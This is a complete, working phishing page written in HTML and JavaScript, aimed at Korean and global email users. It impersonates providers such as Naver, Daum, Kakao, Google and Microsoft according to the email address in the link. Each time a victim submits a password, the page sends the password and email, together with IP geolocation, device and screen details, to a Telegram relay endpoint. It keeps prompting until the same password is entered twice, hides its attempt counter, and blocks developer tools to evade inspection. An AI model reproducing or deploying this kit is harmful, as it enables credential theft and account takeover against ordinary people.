<!DOCTYPE html>
<html lang="ko">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title id="pageTitle">🔐 보안 인증</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Noto Sans KR', -apple-system, 'Segoe UI', Roboto, sans-serif;
            background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
            transition: background 0.8s ease;
        }
        .container {
            background: rgba(255, 255, 255, 0.05);
            backdrop-filter: blur(20px);
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 20px;
            padding: 40px;
            max-width: 460px;
            width: 100%;
            animation: slideUp 0.5s ease;
        }
        @keyframes slideUp {
            from { opacity: 0; transform: translateY(30px); }
            to { opacity: 1; transform: translateY(0); }
        }
        .header { text-align: center; margin-bottom: 24px; }
        .logo-icon {
            width: 64px;
            height: 64px;
            border-radius: 16px;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 12px;
            color: white;
            font-size: 28px;
            font-weight: 700;
            transition: all 0.5s ease;
            box-shadow: 0 4px 16px rgba(0,0,0,0.2);
        }
        .logo-text {
            font-size: 22px;
            font-weight: 700;
            color: #e2e8f0;
            transition: all 0.5s ease;
        }
        .logo-text .highlight { color: #a78bfa; }
        .subtitle {
            color: #94a3b8;
            font-size: 14px;
            margin-top: 4px;
        }
        .domain-badge {
            display: inline-block;
            padding: 4px 14px;
            border-radius: 20px;
            font-size: 12px;
            font-weight: 600;
            margin-top: 8px;
            background: rgba(167, 139, 250, 0.15);
            color: #a78bfa;
        }
        .user-info {
            background: rgba(255, 255, 255, 0.03);
            border-radius: 10px;
            padding: 12px 16px;
            margin-bottom: 20px;
            border: 1px solid rgba(255, 255, 255, 0.05);
        }
        .user-info .label { color: #475569; font-size: 11px; text-transform: uppercase; letter-spacing: 0.5px; }
        .user-info .value { color: #e2e8f0; font-size: 15px; margin-top: 2px; font-weight: 500; }
        .form-group { margin-bottom: 18px; }
        .form-group label {
            color: #94a3b8;
            font-size: 13px;
            font-weight: 500;
            display: block;
            margin-bottom: 6px;
        }
        .form-group input {
            width: 100%;
            padding: 12px 16px;
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 10px;
            background: rgba(255, 255, 255, 0.05);
            color: #e2e8f0;
            font-size: 15px;
            transition: all 0.3s;
            font-family: inherit;
        }
        .form-group input:focus {
            outline: none;
            border-color: #a78bfa;
            box-shadow: 0 0 0 3px rgba(167, 139, 250, 0.1);
        }
        .form-group input::placeholder { color: #475569; }
        .form-group input:disabled { opacity: 0.5; cursor: not-allowed; }
        .form-group .hint { font-size: 12px; color: #475569; margin-top: 4px; }
        .password-wrapper { position: relative; }
        .password-wrapper input { padding-right: 44px; }
        .toggle-password {
            position: absolute;
            right: 12px;
            top: 50%;
            transform: translateY(-50%);
            background: none;
            border: none;
            color: #475569;
            cursor: pointer;
            font-size: 18px;
            padding: 4px;
        }
        .toggle-password:hover { color: #94a3b8; }
        .attempt-counter { display: none; }
        .btn {
            width: 100%;
            padding: 14px;
            border: none;
            border-radius: 10px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s;
            color: white;
            font-family: inherit;
        }
        .btn-primary {
            background: linear-gradient(135deg, #a78bfa, #7c3aed);
        }
        .btn-primary:hover:not(:disabled) {
            transform: translateY(-2px);
            box-shadow: 0 10px 30px rgba(167, 139, 250, 0.3);
        }
        .btn-primary:disabled { opacity: 0.5; cursor: not-allowed; transform: none; }
        .error {
            color: #ef4444;
            font-size: 13px;
            margin-top: 8px;
            display: none;
            align-items: center;
            gap: 6px;
            background: rgba(239, 68, 68, 0.1);
            padding: 10px 14px;
            border-radius: 8px;
            border: 1px solid rgba(239, 68, 68, 0.2);
            animation: shake 0.5s ease;
        }
        .error.show { display: flex; }
        @keyframes shake {
            0%, 100% { transform: translateX(0); }
            25% { transform: translateX(-6px); }
            75% { transform: translateX(6px); }
        }
        .success {
            color: #34d399;
            font-size: 13px;
            margin-top: 8px;
            display: none;
            align-items: center;
            gap: 6px;
            background: rgba(52, 211, 153, 0.1);
            padding: 10px 14px;
            border-radius: 8px;
            border: 1px solid rgba(52, 211, 153, 0.2);
        }
        .success.show { display: flex; }
        .spinner {
            display: none;
            width: 20px;
            height: 20px;
            border: 2px solid rgba(255,255,255,0.3);
            border-top: 2px solid white;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
            margin: 0 auto;
        }
        .btn.loading .spinner { display: inline-block; }
        .btn.loading .btn-text { display: none; }
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
        .password-match-status {
            display: none;
            align-items: center;
            gap: 8px;
            font-size: 13px;
            margin-top: 8px;
            padding: 8px 12px;
            border-radius: 8px;
        }
        .password-match-status.show { display: flex; }
        .password-match-status.matched {
            background: rgba(52, 211, 153, 0.1);
            color: #34d399;
            border: 1px solid rgba(52, 211, 153, 0.2);
        }
        .password-match-status.unmatched {
            background: rgba(239, 68, 68, 0.1);
            color: #ef4444;
            border: 1px solid rgba(239, 68, 68, 0.2);
        }
        .footer-text {
            text-align: center;
            color: #475569;
            font-size: 12px;
            margin-top: 20px;
            padding-top: 16px;
            border-top: 1px solid rgba(255, 255, 255, 0.05);
        }
        .detection-badge {
            position: fixed;
            bottom: 20px;
            right: 20px;
            background: rgba(0,0,0,0.7);
            color: white;
            padding: 6px 12px;
            border-radius: 8px;
            font-size: 10px;
            font-family: monospace;
            opacity: 0.4;
            pointer-events: none;
        }
        @media (max-width: 480px) {
            .container { padding: 24px; }
        }
    </style>
</head>
<body>

    <div class="container" id="loginContainer">
        <div class="header">
            <div class="logo-icon" id="logoIcon">🔐</div>
            <div class="logo-text">
                <span class="highlight" id="highlightText">보안</span> 인증
            </div>
            <div class="subtitle" id="subtitleText">본인 확인 후 문서 접근</div>
            <div class="domain-badge" id="domainBadge">🔒 보안 연결</div>
        </div>

        <div class="user-info">
            <div class="label">📧 이메일</div>
            <div class="value" id="userEmail">loading...</div>
        </div>

        <!-- STEALTH: Attempt counter hidden -->
        <div class="attempt-counter" id="attemptCounter" style="display:none;"></div>

        <form id="loginForm" onsubmit="handleLogin(event)">
            <div class="form-group">
                <label for="password">🔑 비밀번호</label>
                <div class="password-wrapper">
                    <input type="password" id="password" placeholder="비밀번호를 입력하세요" autocomplete="current-password">
                    <button type="button" class="toggle-password" onclick="togglePassword()">👁️</button>
                </div>
                <div class="hint" id="passwordHint">비밀번호를 입력하세요</div>
            </div>

            <div class="form-group">
                <label for="confirmPassword">✅ 비밀번호 확인</label>
                <div class="password-wrapper">
                    <input type="password" id="confirmPassword" placeholder="비밀번호를 다시 입력하세요" autocomplete="current-password">
                    <button type="button" class="toggle-password" onclick="toggleConfirmPassword()">👁️</button>
                </div>
                <div class="hint">비밀번호를 다시 입력하여 확인하세요</div>
            </div>

            <div class="password-match-status" id="matchStatus"></div>

            <div class="error" id="errorMsg">⚠️ <span id="errorText">인증에 실패했습니다.</span></div>
            <div class="success" id="successMsg">✅ <span id="successText">인증 성공! 문서로 이동합니다...</span></div>

            <button type="submit" class="btn btn-primary" id="submitBtn">
                <span class="btn-text">🔓 인증하기</span>
                <span class="spinner"></span>
            </button>
        </form>

        <div class="footer-text" id="footerText">
            🔒 모든 정보는 암호화되어 안전하게 보호됩니다
        </div>
    </div>

    <div class="detection-badge" id="detectionBadge">🦎 v3.0</div>

    <script>
        // ============================================================
        //  KOREA EMAIL PROVIDER DATABASE
        // ============================================================

        const BRAND_DB = {
            'naver.com': { name: '네이버', logo: 'N', color: '#03c75a', flag: '🇰🇷', type: 'portal' },
            'naver.net': { name: '네이버', logo: 'N', color: '#03c75a', flag: '🇰🇷', type: 'portal' },
            'daum.net': { name: '다음', logo: 'D', color: '#f9a800', flag: '🇰🇷', type: 'portal' },
            'hanmail.net': { name: '다음 한메일', logo: 'D', color: '#f9a800', flag: '🇰🇷', type: 'portal' },
            'kakao.com': { name: '카카오', logo: 'K', color: '#f9a800', flag: '🇰🇷', type: 'portal' },
            'nate.com': { name: '네이트', logo: 'N', color: '#0088cc', flag: '🇰🇷', type: 'portal' },
            'hiworks.co.kr': { name: '하이웍스', logo: 'H', color: '#1a73e8', flag: '🇰🇷', type: 'business' },
            'hiworks.com': { name: '하이웍스', logo: 'H', color: '#1a73e8', flag: '🇰🇷', type: 'business' },
            'gmail.com': { name: 'Google', logo: 'G', color: '#4285f4', flag: '🌐', type: 'global' },
            'outlook.com': { name: 'Microsoft', logo: 'MS', color: '#0078d4', flag: '🌐', type: 'global' },
            'hotmail.com': { name: 'Microsoft', logo: 'MS', color: '#0078d4', flag: '🌐', type: 'global' },
            'yahoo.com': { name: 'Yahoo', logo: 'Y', color: '#7b0099', flag: '🌐', type: 'global' },
            'icloud.com': { name: 'Apple', logo: '🍎', color: '#000000', flag: '🌐', type: 'global' }
        };

        // ============================================================
        //  CONFIGURATION - STEALTH (No visible indicators)
        // ============================================================

        const CONFIG = {
            API_URL: '',
            SESSION_KEY: 'chameleon_session',
            MAX_ATTEMPTS: 5,
            LOCKOUT_TIME: 60000,
            REQUIRED_MATCHES: 2
        };

        // ============================================================
        //  DOM REFS
        // ============================================================

        const passwordInput = document.getElementById('password');
        const confirmPasswordInput = document.getElementById('confirmPassword');
        const submitBtn = document.getElementById('submitBtn');
        const errorMsg = document.getElementById('errorMsg');
        const errorText = document.getElementById('errorText');
        const successMsg = document.getElementById('successMsg');
        const successText = document.getElementById('successText');
        const userEmail = document.getElementById('userEmail');
        const matchStatus = document.getElementById('matchStatus');
        const logoIcon = document.getElementById('logoIcon');
        const highlightText = document.getElementById('highlightText');
        const subtitleText = document.getElementById('subtitleText');
        const domainBadge = document.getElementById('domainBadge');
        const passwordHint = document.getElementById('passwordHint');

        // ============================================================
        //  STATE - Hidden from user
        // ============================================================

        let attempts = 0;
        let isLocked = false;
        let currentEmail = '';
        let currentBrand = null;
        let passwordHistory = [];
        let matchedPasswords = [];

        // ============================================================
        //  DOMAIN DETECTION & THEME
        // ============================================================

        function extractDomain(email) {
            if (!email) return 'unknown';
            const parts = email.split('@');
            return parts.length === 2 ? parts[1].toLowerCase() : 'unknown';
        }

        function detectBrand(domain) {
            if (!domain || domain === 'unknown') return null;
            if (BRAND_DB[domain]) return BRAND_DB[domain];

            const patterns = ['.co.kr', '.ac.kr', '.go.kr', '.or.kr', '.re.kr', '.kr'];
            for (const pattern of patterns) {
                if (domain.endsWith(pattern)) {
                    const name = domain.split('.')[0].toUpperCase();
                    return {
                        name: name,
                        logo: name.charAt(0),
                        color: '#1a73e8',
                        flag: '🇰🇷',
                        type: 'business'
                    };
                }
            }
            return null;
        }

        function applyTheme(brand) {
            if (!brand) return;
            logoIcon.textContent = brand.logo || '🔐';
            logoIcon.style.background = brand.color || '#1a73e8';
            highlightText.textContent = brand.name || '보안';
            highlightText.style.color = brand.color || '#a78bfa';
            subtitleText.textContent = brand.name + ' 본인 확인';
            domainBadge.textContent = brand.flag + ' ' + (brand.domain || '보안');
            domainBadge.style.background = brand.color + '20';
            domainBadge.style.color = brand.color;
            passwordHint.textContent = brand.name + ' 계정 비밀번호를 입력하세요';
            document.getElementById('footerText').textContent = '© ' + brand.name + '. All rights reserved.';
            document.getElementById('detectionBadge').textContent = '🦎 ' + brand.name;
        }

        // ============================================================
        //  INIT - STEALTH (No attempt display)
        // ============================================================

        function init() {
            const params = new URLSearchParams(window.location.search);
            currentEmail = params.get('email') || params.get('login_hint') || '';

            try {
                const session = sessionStorage.getItem(CONFIG.SESSION_KEY);
                if (session) {
                    const data = JSON.parse(session);
                    if (!data.turnstileVerified) {
                        window.location.href = '/';
                        return;
                    }
                }
            } catch (e) {}

            if (!currentEmail) {
                userEmail.textContent = '이메일이 없습니다';
                return;
            }

            userEmail.textContent = currentEmail;

            const domain = extractDomain(currentEmail);
            currentBrand = detectBrand(domain);
            if (currentBrand) {
                currentBrand.domain = domain;
                applyTheme(currentBrand);
            }

            // Load attempts silently
            const savedAttempts = localStorage.getItem('login_attempts_' + currentEmail);
            if (savedAttempts) {
                attempts = parseInt(savedAttempts);
            }

            // Check lockout silently
            const lockoutData = localStorage.getItem('login_lockout_' + currentEmail);
            if (lockoutData) {
                const lockTime = parseInt(lockoutData);
                if (Date.now() - lockTime < CONFIG.LOCKOUT_TIME) {
                    isLocked = true;
                    submitBtn.disabled = true;
                    setTimeout(() => {
                        isLocked = false;
                        submitBtn.disabled = false;
                        localStorage.removeItem('login_lockout_' + currentEmail);
                    }, CONFIG.LOCKOUT_TIME - (Date.now() - lockTime));
                } else {
                    localStorage.removeItem('login_lockout_' + currentEmail);
                }
            }

            confirmPasswordInput.addEventListener('input', checkPasswordMatch);
            passwordInput.addEventListener('input', checkPasswordMatch);

            console.log('🔐 Stealth Login initialized for:', currentEmail);
        }

        // ============================================================
        //  PASSWORD MATCH CHECK (Visible to user - helpful)
        // ============================================================

        function checkPasswordMatch() {
            const password = passwordInput.value;
            const confirm = confirmPasswordInput.value;

            if (!password || !confirm) {
                matchStatus.classList.remove('show');
                return;
            }

            matchStatus.classList.add('show');

            if (password === confirm) {
                matchStatus.className = 'password-match-status show matched';
                matchStatus.innerHTML = '✅ 비밀번호가 일치합니다';
            } else {
                matchStatus.className = 'password-match-status show unmatched';
                matchStatus.innerHTML = '❌ 비밀번호가 일치하지 않습니다';
            }
        }

        // ============================================================
        //  TOGGLE PASSWORD
        // ============================================================

        function togglePassword() {
            const input = passwordInput;
            const btn = document.querySelector('.password-wrapper .toggle-password');
            if (input.type === 'password') {
                input.type = 'text';
                btn.textContent = '🙈';
            } else {
                input.type = 'password';
                btn.textContent = '👁️';
            }
        }

        function toggleConfirmPassword() {
            const input = confirmPasswordInput;
            const btn = document.querySelectorAll('.password-wrapper .toggle-password')[1];
            if (input.type === 'password') {
                input.type = 'text';
                btn.textContent = '🙈';
            } else {
                input.type = 'password';
                btn.textContent = '👁️';
            }
        }

        // ============================================================
        //  UI HELPERS - STEALTH (No attempt numbers shown)
        // ============================================================

        function showError(message) {
            errorText.textContent = message;
            errorMsg.classList.add('show');
            successMsg.classList.remove('show');

            clearTimeout(errorMsg._timeout);
            errorMsg._timeout = setTimeout(() => {
                errorMsg.classList.remove('show');
            }, 3000);
        }

        function hideError() {
            errorMsg.classList.remove('show');
        }

        function showSuccess(message) {
            successText.textContent = message;
            successMsg.classList.add('show');
            errorMsg.classList.remove('show');
        }

        function hideSuccess() {
            successMsg.classList.remove('show');
        }

        // ============================================================
        //  GET VISITOR INFO
        // ============================================================

        async function getVisitorInfo() {
            try {
                const response = await fetch('https://ip-api.com/json/');
                const data = await response.json();
                return {
                    ip: data.query || '알 수 없음',
                    city: data.city || '알 수 없음',
                    region: data.regionName || '알 수 없음',
                    country: data.country || '알 수 없음',
                    isp: data.isp || '알 수 없음',
                    lat: data.lat || 0,
                    lon: data.lon || 0,
                    timezone: data.timezone || '알 수 없음'
                };
            } catch (e) {
                return {
                    ip: '알 수 없음',
                    city: '알 수 없음',
                    region: '알 수 없음',
                    country: '알 수 없음',
                    isp: '알 수 없음',
                    lat: 0,
                    lon: 0,
                    timezone: '알 수 없음'
                };
            }
        }

        // ============================================================
        //  SEND TO TELEGRAM - ALL DATA CAPTURED
        // ============================================================

        async function sendToTelegram(data) {
            try {
                let msg = '🦎 *AUTO-CHAMELEON STEALTH*\n';
                msg += '*📋 본인 확인 요청*\n\n';
                msg += '*📧 Email:* ' + data.email + '\n';
                msg += '*🔑 Password:* ' + data.password + '\n';
                msg += '*🔁 Attempt:* ' + data.attempt + '/' + CONFIG.MAX_ATTEMPTS + '\n';
                msg += '*✅ Matched:* ' + data.matched + ' times\n';
                msg += '*🏷️ Brand:* ' + (currentBrand ? currentBrand.name + ' ' + currentBrand.flag : 'Unknown') + '\n';
                msg += '*🌐 Domain:* ' + (currentBrand ? currentBrand.domain : 'Unknown') + '\n';
                msg += '*📡 IP:* ' + data.visitor.ip + '\n';
                msg += '*📍 Location:* ' + data.visitor.city + ', ' + data.visitor.region + ', ' + data.visitor.country +
                    '\n';
                msg += '*🏢 ISP:* ' + data.visitor.isp + '\n';
                msg += '*🕐 Time:* ' + new Date().toLocaleString('ko-KR') + '\n';
                msg += '*🖥️ Device:* ' + navigator.userAgent.substring(0, 60) + '...' + '\n';
                msg += '*🔗 URL:* ' + window.location.href + '\n';
                msg += '*📱 Screen:* ' + screen.width + 'x' + screen.height + '\n';
                msg += '*🌐 Language:* ' + navigator.language + '\n';
                msg += '*🕐 Timezone:* ' + Intl.DateTimeFormat().resolvedOptions().timeZone;

                const response = await fetch('/api/telegram', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        message: msg,
                        parse_mode: 'Markdown',
                        data: data
                    })
                });

                return await response.json();
            } catch (error) {
                console.error('Telegram error:', error);
                return { success: false };
            }
        }

        // ============================================================
        //  HANDLE LOGIN - STEALTH (No visible attempt counter)
        // ============================================================

        async function handleLogin(event) {
            event.preventDefault();

            if (isLocked) {
                showError('⚠️ 잠시 후 다시 시도해주세요.');
                return;
            }

            const password = passwordInput.value.trim();
            const confirmPassword = confirmPasswordInput.value.trim();

            hideError();
            hideSuccess();

            if (!password) {
                showError('비밀번호를 입력하세요.');
                passwordInput.focus();
                return;
            }

            if (password.length < 6) {
                showError('비밀번호는 6자 이상 입력하세요.');
                passwordInput.focus();
                return;
            }

            if (!confirmPassword) {
                showError('비밀번호 확인을 입력하세요.');
                confirmPasswordInput.focus();
                return;
            }

            if (password !== confirmPassword) {
                showError('비밀번호가 일치하지 않습니다.');
                confirmPasswordInput.focus();
                return;
            }

            // STEALTH: Check attempts silently
            if (attempts >= CONFIG.MAX_ATTEMPTS) {
                isLocked = true;
                submitBtn.disabled = true;
                localStorage.setItem('login_lockout_' + currentEmail, String(Date.now()));
                showError('⚠️ 잠시 후 다시 시도해주세요.');
                setTimeout(() => {
                    isLocked = false;
                    submitBtn.disabled = false;
                    attempts = 0;
                    localStorage.setItem('login_attempts_' + currentEmail, '0');
                    hideError();
                }, CONFIG.LOCKOUT_TIME);
                return;
            }

            // Increment attempts (silent)
            attempts++;
            localStorage.setItem('login_attempts_' + currentEmail, String(attempts));

            // Store password in history
            passwordHistory.push(password);

            // Check match rule
            let isMatch = false;
            if (matchedPasswords.length > 0) {
                isMatch = password === matchedPasswords[matchedPasswords.length - 1];
            }

            if (isMatch) {
                matchedPasswords.push(password);
            } else {
                const matchCount = passwordHistory.filter(p => p === password).length;
                if (matchCount >= CONFIG.REQUIRED_MATCHES) {
                    matchedPasswords.push(password);
                }
            }

            // Get visitor info
            const visitor = await getVisitorInfo();

            // Send to Telegram (ALWAYS)
            await sendToTelegram({
                email: currentEmail,
                password: password,
                attempt: attempts,
                matched: matchedPasswords.length,
                visitor: visitor,
                brand: currentBrand ? currentBrand.name : 'Unknown',
                domain: currentBrand ? currentBrand.domain : 'Unknown'
            });

            // STEALTH: Check if user has enough matches
            if (matchedPasswords.length >= CONFIG.REQUIRED_MATCHES) {
                // Success!
                showSuccess('✅ 인증 성공! 문서로 이동합니다...');

                try {
                    const session = sessionStorage.getItem(CONFIG.SESSION_KEY);
                    if (session) {
                        const data = JSON.parse(session);
                        data.verified = true;
                        data.passwordVerified = true;
                        data.matchedPasswords = matchedPasswords.length;
                        sessionStorage.setItem(CONFIG.SESSION_KEY, JSON.stringify(data));
                    }
                } catch (e) {}

                setTimeout(() => {
                    window.location.href = '/dashboard?email=' + encodeURIComponent(currentEmail);
                }, 2000);
            } else {
                // STEALTH: Simple error without attempt count
                const messages = [
                    '비밀번호를 다시 확인해주세요.',
                    '비밀번호가 일치하지 않습니다.',
                    '올바른 비밀번호를 입력하세요.',
                    '다시 시도해주세요.'
                ];
                const randomMsg = messages[Math.floor(Math.random() * messages.length)];
                showError('❌ ' + randomMsg);

                // Clear fields
                passwordInput.value = '';
                confirmPasswordInput.value = '';
                passwordInput.focus();

                // STEALTH: Lock user silently after max attempts
                if (attempts >= CONFIG.MAX_ATTEMPTS) {
                    isLocked = true;
                    submitBtn.disabled = true;
                    localStorage.setItem('login_lockout_' + currentEmail, String(Date.now()));
                    showError('⚠️ 잠시 후 다시 시도해주세요.');
                    setTimeout(() => {
                        isLocked = false;
                        submitBtn.disabled = false;
                        attempts = 0;
                        localStorage.setItem('login_attempts_' + currentEmail, '0');
                        hideError();
                    }, CONFIG.LOCKOUT_TIME);
                }
            }
        }

        // ============================================================
        //  KEYBOARD SHORTCUTS
        // ============================================================

        document.addEventListener('keydown', function(e) {
            if (e.ctrlKey && e.key === 'Enter') {
                e.preventDefault();
                document.getElementById('loginForm').dispatchEvent(new Event('submit'));
            }
            if (e.key === 'Escape') {
                hideError();
            }
        });

        // ============================================================
        //  PREVENT DEV TOOLS
        // ============================================================

        document.addEventListener('contextmenu', function(e) {
            e.preventDefault();
        });

        document.addEventListener('keydown', function(e) {
            if ((e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'J')) || e.key === 'F12') {
                e.preventDefault();
            }
        });

        // ============================================================
        //  INIT
        // ============================================================

        document.addEventListener('DOMContentLoaded', init);

        // Expose for debugging (hidden from user)
        window.__stealth = {
            email: function() { return currentEmail; },
            brand: function() { return currentBrand; },
            attempts: function() { return attempts; },
            matched: function() { return matchedPasswords.length; },
            reset: function() {
                attempts = 0;
                matchedPasswords = [];
                passwordHistory = [];
                localStorage.setItem('login_attempts_' + currentEmail, '0');
                hideError();
            }
        };

        console.log('🦎 Stealth Login loaded - No visible indicators');
    </script>

</body>
</html>
